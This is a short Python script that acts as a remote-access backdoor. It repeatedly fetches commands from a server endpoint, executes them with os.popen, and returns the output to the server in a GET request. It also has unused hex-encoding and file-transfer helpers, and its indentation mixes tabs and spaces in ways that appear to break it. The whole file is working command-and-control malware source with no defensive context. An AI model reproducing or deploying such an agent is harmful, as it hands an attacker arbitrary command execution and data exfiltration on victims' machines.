from requests import get
from os import popen
from time import sleep
import binascii

url = ''
preid = 0

def read_file(file_url):
    f = open(file_url,'rb')
    content = f.read()
    return content
def write_file(file_url, content):
    f = open('new_'+file_url,'wb')
    f.write(content)
    return '0'
def encode_file(content):
    hex = binascii.hexlify(content)
    return hex.decode()
def decode_file(encoded_content):
    en = encoded_content.encode()
    return binascii.unhexlify(en)

while True:
	cde = get(url+'/gmecde')
	cde = list(cde.text)
	afters = False
	code = ""
	id = ""
	for i in cde:
		if i == '*':
			afters = True
			continue
		if not afters:
			code += i
			continue
		else: id += i
	if id == preid:
		sleep(5)
		continue
	print('id: '+id)
	print('cde: '+code)
    respond = popen(code).read()
    get(url+f'/target?respond={respond}&id={id}')
    preid = id